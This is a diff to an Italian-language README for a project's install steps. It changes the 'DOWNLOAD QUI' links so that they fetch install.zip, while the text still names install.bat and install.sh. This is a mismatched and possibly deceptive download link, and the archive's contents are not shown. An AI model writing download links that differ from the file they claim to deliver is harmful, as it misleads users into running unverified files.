@@ -4,7 +4,7 @@
 
 ### Windows
 
-1. Scarica il file [`install.bat`](https://github.com/UVAVIVA/climaoro-motore/blob/main/install.bat)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[(DOWNLOAD QUI)](https://github.com/UVAVIVA/climaoro-motore/raw/main/install.bat)
+1. Scarica il file [`install.bat`](https://github.com/UVAVIVA/climaoro-motore/blob/main/install.bat)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[(DOWNLOAD QUI)](https://github.com/UVAVIVA/climaoro-motore/raw/main/install.zip)
 2. Fai **doppio clic** su `install.bat`
 3. Lo script:
    - Installa Python e PlatformIO se non ci sono gia
@@ -15,7 +15,7 @@
 
 ### Linux / macOS
 
-1. Scarica il file [`install.sh`](install.sh)
+1. Scarica il file [`install.sh`](https://github.com/UVAVIVA/climaoro-motore/blob/main/install.sh)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[(DOWNLOAD QUI)](https://github.com/UVAVIVA/climaoro-motore/raw/main/install.zip)
 2. Apri un terminale nella cartella del file
 3. Rendilo eseguibile e avvialo:
    ```bash
